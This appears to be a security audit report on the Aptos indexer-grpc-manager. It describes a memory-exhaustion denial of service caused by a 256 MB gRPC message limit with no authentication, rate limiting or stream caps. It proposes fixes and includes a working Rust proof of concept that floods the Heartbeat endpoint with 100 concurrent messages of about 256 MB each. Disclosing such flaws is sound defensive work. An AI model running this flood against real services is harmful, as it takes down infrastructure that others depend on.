# Audit Report

## Title
Memory Exhaustion DoS via Unbounded Message Size in Indexer gRPC Manager

## Summary

The `indexer-grpc-manager` service allows gRPC messages up to 256 MB without authentication, rate limiting, or concurrency controls. An attacker can craft malicious `HeartbeatRequest` messages containing thousands of `ActiveStream` entries with extensive progress data, opening multiple concurrent connections to exhaust available memory and crash the service.

## Finding Description

The indexer gRPC manager configures both encoding and decoding message size limits to 256 MB: [1](#0-0) 

This constant is applied to the gRPC server without additional protections: [2](#0-1) 

The service exposes three unprotected endpoints (`Heartbeat`, `GetTransactions`, `GetDataServiceForRequest`) defined in the protobuf specification: [3](#0-2) 

**Critical Missing Protections:**

1. **No Authentication**: The service implements no authentication mechanism. While authentication headers are defined in the constants file, no validation logic exists in the manager: [4](#0-3) 

The service implementation shows no authentication checks in any endpoint handler: [5](#0-4) 

2. **No Rate Limiting**: No rate limiting mechanisms exist in the codebase.

3. **No Concurrency Limits**: The server does not configure `max_concurrent_streams`, relying on default HTTP/2 limits: [6](#0-5) 

**Attack Vector:**

The `HeartbeatRequest` message structure allows unbounded growth through nested repeated fields: [7](#0-6) [8](#0-7) [9](#0-8) [10](#0-9) 

An attacker can craft a `HeartbeatRequest` containing:
- 1,000 `ActiveStream` entries
- Each with 6,700 `StreamProgressSampleProto` samples
- Total size: ~268 MB per message

With default HTTP/2 concurrent streams (typically 100-250), an attacker opening 100 connections and sending such messages would allocate **25.6 GB** of memory as tonic buffers each message during decoding.

## Impact Explanation

**Severity: High**

This vulnerability causes **API crashes** and service unavailability, qualifying as **High Severity** per Aptos bug bounty criteria: [11](#0-10) 

When the indexer gRPC manager crashes:
- Data services cannot register via heartbeat
- Fullnodes cannot send health updates
- Transaction routing becomes unavailable through `GetDataServiceForRequest`
- The entire indexing pipeline breaks
- External applications dependent on indexed data lose access

While this does not directly affect consensus or blockchain operation, it impacts critical infrastructure for blockchain data access and monitoring.

## Likelihood Explanation

**Likelihood: Medium to High**

The attack is highly feasible:
- **No authentication barrier**: Any client reaching the service can exploit it
- **Simple attack**: Crafting large protobuf messages requires minimal effort
- **Repeatable**: No rate limiting prevents sustained attacks
- **Network access**: While intended as internal infrastructure, misconfigurations or compromised internal components provide attack vectors

The service expects to operate behind an API Gateway for authentication, as indicated by deprecation comments: [12](#0-11) 

However, defense-in-depth principles dictate that services should implement their own protections regardless of upstream dependencies.

## Recommendation

Implement multiple layers of protection:

1. **Add Concurrency Limits**: Configure `max_concurrent_streams` on the server builder:
```rust
let server = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_max_concurrent_streams(Some(100))  // Add this
    .add_service(service);
```

2. **Reduce MAX_MESSAGE_SIZE**: The 256 MB limit is excessive for heartbeat messages. Legitimate heartbeats should be under 1 MB:
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 1 * (1 << 20); // 1 MB
```

3. **Add Authentication**: Implement interceptor-based authentication even behind API Gateway:
```rust
async fn auth_interceptor(req: Request<()>) -> Result<Request<()>, Status> {
    let token = req.metadata().get("authorization")
        .ok_or_else(|| Status::unauthenticated("Missing auth token"))?;
    // Validate token
    Ok(req)
}

let service = GrpcManagerServer::new(service_impl)
    .with_interceptor(auth_interceptor)
    .max_encoding_message_size(MAX_MESSAGE_SIZE)
    .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

4. **Add Rate Limiting**: Implement per-client rate limiting based on IP or authenticated identity.

## Proof of Concept

```rust
// PoC demonstrating memory exhaustion attack
use aptos_protos::indexer::v1::{
    HeartbeatRequest, ServiceInfo, LiveDataServiceInfo, StreamInfo, 
    ActiveStream, StreamProgress, StreamProgressSampleProto,
    grpc_manager_client::GrpcManagerClient,
};
use tonic::transport::Channel;

#[tokio::test]
async fn test_memory_exhaustion_attack() {
    // Connect to indexer-grpc-manager service
    let channel = Channel::from_static("http://localhost:50051")
        .connect()
        .await
        .unwrap();
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Craft malicious HeartbeatRequest with ~256 MB size
    let mut active_streams = vec![];
    for i in 0..1000 {
        let mut samples = vec![];
        for j in 0..6700 {
            samples.push(StreamProgressSampleProto {
                timestamp: Some(aptos_protos::util::timestamp::Timestamp {
                    seconds: 1000000 + j,
                    nanos: 0,
                }),
                version: j as u64,
                size_bytes: 1024,
            });
        }
        
        active_streams.push(ActiveStream {
            id: format!("stream_{}", i),
            start_time: Some(aptos_protos::util::timestamp::Timestamp {
                seconds: 1000000,
                nanos: 0,
            }),
            start_version: 0,
            end_version: Some(6700),
            progress: Some(StreamProgress { samples }),
        });
    }
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("malicious_client".to_string()),
            info: Some(aptos_protos::indexer::v1::service_info::Info::LiveDataServiceInfo(
                LiveDataServiceInfo {
                    chain_id: 1,
                    timestamp: Some(aptos_protos::util::timestamp::Timestamp {
                        seconds: 1000000,
                        nanos: 0,
                    }),
                    known_latest_version: Some(1000000),
                    stream_info: Some(StreamInfo { active_streams }),
                    min_servable_version: Some(0),
                }
            )),
        }),
    };
    
    // Send multiple concurrent requests to exhaust memory
    let mut handles = vec![];
    for _ in 0..100 {
        let mut client_clone = client.clone();
        let request_clone = request.clone();
        handles.push(tokio::spawn(async move {
            client_clone.heartbeat(request_clone).await
        }));
    }
    
    // Service will experience memory exhaustion with 100 * 256 MB = 25.6 GB
    for handle in handles {
        let _ = handle.await;
    }
}
```

## Notes

This vulnerability specifically affects the indexer infrastructure, not core consensus. However, it represents a critical availability issue for blockchain data access services. The lack of basic protections (authentication, rate limiting, concurrency controls) in combination with an excessively large message size limit creates a trivially exploitable DoS vector.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L15-15)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L22-28)
```rust
pub(crate) struct GrpcManager {
    chain_id: u64,
    file_store_uploader: Mutex<FileStoreUploader>,
    metadata_manager: Arc<MetadataManager>,
    data_manager: Arc<DataManager>,
    is_master: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L99-100)
```rust
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L101-104)
```rust
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L12-16)
```text
message StreamProgressSampleProto {
  optional aptos.util.timestamp.Timestamp timestamp = 1;
  uint64 version = 2;
  uint64 size_bytes = 3;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L22-29)
```text
message ActiveStream {
  string id = 1;
  optional aptos.util.timestamp.Timestamp start_time = 2;
  uint64 start_version = 3;
  optional uint64 end_version = 4;

  optional StreamProgress progress = 5;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L31-33)
```text
message StreamInfo {
  repeated ActiveStream active_streams = 1;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L74-80)
```text
message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}

message HeartbeatResponse {
  optional uint64 known_latest_version = 1;
}
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L103-107)
```text
service GrpcManager {
  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
  rpc GetTransactions(GetTransactionsRequest) returns (TransactionsResponse);
  rpc GetDataServiceForRequest(GetDataServiceForRequestRequest) returns (GetDataServiceForRequestResponse);
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L12-17)
```rust
// GRPC request metadata key for the token ID.
pub const GRPC_AUTH_TOKEN_HEADER: &str = "x-aptos-data-authorization";
// GRPC request metadata key for the request name. This is used to identify the
// data destination.
pub const GRPC_REQUEST_NAME_HEADER: &str = "x-aptos-request-name";
pub const GRPC_API_GATEWAY_API_KEY_HEADER: &str = "authorization";
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L52-54)
```rust
    // Token is no longer needed behind api gateway.
    #[deprecated]
    pub request_token: String,
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```
